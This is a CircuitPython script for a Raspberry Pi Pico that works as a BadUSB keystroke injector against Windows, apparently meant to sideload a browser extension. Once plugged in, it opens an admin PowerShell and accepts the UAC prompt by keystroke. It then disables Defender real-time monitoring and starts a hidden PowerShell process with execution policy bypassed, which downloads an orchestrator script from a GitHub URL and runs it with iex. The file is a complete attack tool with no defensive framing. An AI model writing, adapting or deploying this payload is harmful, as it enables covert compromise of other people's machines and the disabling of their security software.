# code.py for Raspberry Pi Pico
# Target: Windows - Sideload Browser Extension via PowerShell Orchestrator
# VERSION WITH GP0 PAYLOAD DISABLE CHECK ENABLED

import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
import supervisor # Used for autoreload and potentially other runtime features

# --- Configuration ---
# <<<<<<< YOUR HOSTED SCRIPT URL >>>>>
ORCHESTRATOR_URL = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/PS_Scripts/Sideload-Orchestrator.ps1"
# <<<<<<< END OF URL >>>>>

# Delays (in seconds) - adjust if typing is too fast or slow for the target
DELAY_INITIAL_HID = 3.0  # Time for PC to recognize the Pico as a keyboard
DELAY_AFTER_RUN_DIALOG = 0.8 # Time after Win+R before typing
DELAY_AFTER_CTRL_SHIFT_ENTER = 1.8 # Time for UAC prompt to appear
DELAY_AFTER_UAC_RESPONSE = 5.5   # Time for Admin PowerShell to open and get focus
DELAY_CHAR_TYPING = 0.03         # Delay between individual characters
DELAY_LINE_TYPING = 0.05         # Delay after typing a line/chunk
DELAY_AFTER_FINAL_ENTER = 0.5    # Delay after executing the main PS command

# UAC Handling Method:
# 'ALT_Y': Assumes 'Y' is the hotkey for 'Yes' (common in English Windows)
# 'ENTER_DEFAULT': Assumes 'Yes' is the default selected button
UAC_METHOD = 'ALT_Y' # Choose 'ALT_Y' or 'ENTER_DEFAULT'

# --- Pico Setup ---
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT
led.value = False # Start with LED off

# Set up keyboard
try:
    # Ensure supervisor autoreload is off for stability during payload run
    supervisor.runtime.autoreload = False
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
    print("Keyboard initialized.")
except Exception as e:
    print(f"Error initializing keyboard: {e}")
    # Blink LED rapidly to indicate error
    while True:
        led.value = not led.value
        time.sleep(0.1)

# --- Helper Functions for Typing ---
def key_press(key_or_keys):
    """Presses one or more keys."""
    try:
        if isinstance(key_or_keys, tuple) or isinstance(key_or_keys, list):
            kbd.press(*key_or_keys)
        else:
            kbd.press(key_or_keys)
    except Exception as e:
        print(f"Error pressing key: {e}")

def key_release(key_or_keys=None):
    """Releases one, more, or all keys."""
    try:
        if key_or_keys:
            if isinstance(key_or_keys, tuple) or isinstance(key_or_keys, list):
                kbd.release(*key_or_keys)
            else:
                kbd.release(key_or_keys)
        else:
            kbd.release_all() # Release all keys
    except Exception as e:
        print(f"Error releasing key: {e}")


def key_stroke(key_or_keys, delay_after_press=0.05, delay_after_release=0.1):
    """Simulates pressing and releasing keys."""
    key_press(key_or_keys)
    time.sleep(delay_after_press)
    key_release(key_or_keys) # Release only the specified keys
    time.sleep(delay_after_release)

def type_string(s, char_delay=DELAY_CHAR_TYPING, line_delay=DELAY_LINE_TYPING):
    """Types a string using the keyboard layout."""
    print(f"Typing: {s}") # Print to Pico's serial console for debugging
    try:
        layout.write(s)
        time.sleep(line_delay)
    except Exception as e:
        print(f"Error typing string: {e}")


# --- Main Payload Function ---
def run_watering_hole_payload():
    global led # Allow modification of the global led variable

    led.value = True # LED ON: Payload starting
    print(f"Payload starting in {DELAY_INITIAL_HID} seconds...")
    time.sleep(DELAY_INITIAL_HID)

    # 1. Open Run Dialog (Win + R)
    print("Opening Run dialog (Win+R)...")
    key_stroke((Keycode.GUI, Keycode.R), delay_after_release=DELAY_AFTER_RUN_DIALOG)

    # 2. Type "powershell"
    type_string("powershell")
    time.sleep(0.2) # Brief pause

    # 3. Press Ctrl + Shift + Enter to request Admin privileges
    print("Requesting Admin PowerShell (Ctrl+Shift+Enter)...")
    key_stroke((Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER), delay_after_release=DELAY_AFTER_CTRL_SHIFT_ENTER)

    # 4. Handle UAC Prompt
    print(f"Handling UAC prompt (Method: {UAC_METHOD})...")
    if UAC_METHOD == 'ALT_Y':
        key_stroke((Keycode.ALT, Keycode.Y), delay_after_release=0.3) # Alt+Y
    elif UAC_METHOD == 'ENTER_DEFAULT':
        key_stroke(Keycode.ENTER, delay_after_release=0.3) # Enter (if 'Yes' is default)
    # Add other UAC methods here if needed (e.g., TAB then ENTER)
    
    print(f"Waiting {DELAY_AFTER_UAC_RESPONSE}s for Admin PowerShell window...")
    time.sleep(DELAY_AFTER_UAC_RESPONSE)

    # 5. Construct and type the PowerShell command to launch the hidden orchestrator
    print("Constructing PowerShell command...")
    
    # Command Part 1: Attempt to disable Defender (in the currently visible Admin PS window)
    cmd_part1_defender_disable = "$ProgressPreference='SilentlyContinue'; Write-Host '[PICO_ADMIN_PS] Attempting to disable Defender RT Monitoring...'; Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
    
    # Command Part 2: This is the core command that the *new hidden PowerShell process* will execute.
    # It downloads the orchestrator, runs it, and then tries to re-enable Defender.
    # Single quotes inside this command string need to be doubled ('') for PowerShell.
    inner_ps_command_for_hidden_process = (
        "$ProgressPreference=''SilentlyContinue''; "
        "Write-Host ''[PICO_HIDDEN_PS] Orchestrator execution started.''; "
        "try { "
        # Note the doubled single quotes around the URL within the string
        "    iex (Invoke-RestMethod -Uri ''" + ORCHESTRATOR_URL + "'' -UseBasicParsing -TimeoutSec 180); "
        "    Write-Host ''[PICO_HIDDEN_PS] Orchestrator iex completed.''; "
        "} catch { "
        # Note the doubled single quotes around the error message parts
        "    Write-Host ''[PICO_HIDDEN_PS] Orchestrator download/execution FAILED: $($_.Exception.Message)''; "
        "}; "
        "Write-Host ''[PICO_HIDDEN_PS] Attempting to re-enable Defender RT Monitoring...''; "
        "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; "
        "Write-Host ''[PICO_HIDDEN_PS] Hidden process finished.''"
    )
    
    # Command Part 3: The Start-Process command that the initial Admin PS window will run.
    # This launches the 'inner_ps_command_for_hidden_process' in a new, hidden PowerShell.
    # We define the inner script as a variable first for clarity and robustness.
    define_inner_script_cmd = "$InnerScript = '" + inner_ps_command_for_hidden_process + "'; "

    # The Start-Process command using the $InnerScript variable
    start_hidden_process_cmd = "Write-Host '[PICO_ADMIN_PS] Launching orchestrator in new hidden process...'; Start-Process powershell.exe -ArgumentList '-NoProfile','-NonInteractive','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-Command',$InnerScript -NoNewWindow; "
    
    # Command Part 4: Exit the initial Admin PowerShell window
    cmd_part4_exit = "Write-Host '[PICO_ADMIN_PS] Initial Admin PS window exiting.'; exit"

    # Combine all parts to be typed
    full_ps_command_typed_by_pico = cmd_part1_defender_disable + define_inner_script_cmd + start_hidden_process_cmd + cmd_part4_exit
    
    print(f"Typing main PowerShell command (length: {len(full_ps_command_typed_by_pico)})...")
    # Type the command in chunks for reliability
    chunk_size = 65 # Adjust if typing errors occur
    for i in range(0, len(full_ps_command_typed_by_pico), chunk_size):
        chunk = full_ps_command_typed_by_pico[i:i+chunk_size]
        type_string(chunk, char_delay=0.03, line_delay=0.05)
    
    # Execute the full command typed into the Admin PS window
    key_stroke(Keycode.ENTER, delay_after_release=DELAY_AFTER_FINAL_ENTER)
    
    print("Pico payload sequence finished.")
    led.value = False # LED OFF: Payload finished

# --- GP0 Pin Check to Disable Payload ---
# Connect GP0 pin to a GND pin to disable the payload on boot.
# Leave GP0 floating or connected to 3.3V to enable the payload.
run_payload_on_boot = True # Default to running the payload
try:
    # Ensure supervisor autoreload is off for stability when checking pins
    supervisor.runtime.autoreload = False
    
    gp0 = digitalio.DigitalInOut(GP0)
    gp0.switch_to_input(pull=digitalio.Pull.UP) # Use internal pull-up resistor
    
    # Read the pin state shortly after setting up pull-up
    time.sleep(0.01) # Small delay to allow pull-up to stabilize
    
    # If GP0 is pulled LOW (grounded by user), value will be False.
    if not gp0.value:
        run_payload_on_boot = False
        print("GP0 is grounded. Payload execution SKIPPED.")
        # Blink LED 5 times to indicate skipped payload
        for _ in range(5):
            led.value = True; time.sleep(0.2); led.value = False; time.sleep(0.2)
    else:
        print("GP0 is not grounded (or floating). Payload will run.")
        
    gp0.deinit() # Release the pin

except RuntimeError as e:
    # This error often means the pin is already in use or doesn't exist on the board definition
    print(f"GP0 check error (normal if pin not used/defined for board): {e}. Assuming payload should run.")
except NameError:
     # This happens if GP0 is not defined in the board module at all
     print("GP0 pin not defined for this board. Assuming payload should run.")
except Exception as e:
    print(f"Unexpected error during GP0 check: {e}. Assuming payload should run.")


# --- Main Execution ---
if __name__ == "__main__": # Ensures this runs only when script is executed directly
    if run_payload_on_boot:
        try:
            run_watering_hole_payload()
        except Exception as e:
            print(f"FATAL ERROR during payload execution: {e}")
            # Blink LED rapidly and continuously on fatal error
            while True:
                led.value = not led.value
                time.sleep(0.05)
    else:
        # This block executes if GP0 was grounded
        print("Payload execution was skipped by GP0 pin.")
        # Keep the script running but idle, allowing REPL/Drive access
        while True:
            time.sleep(1)
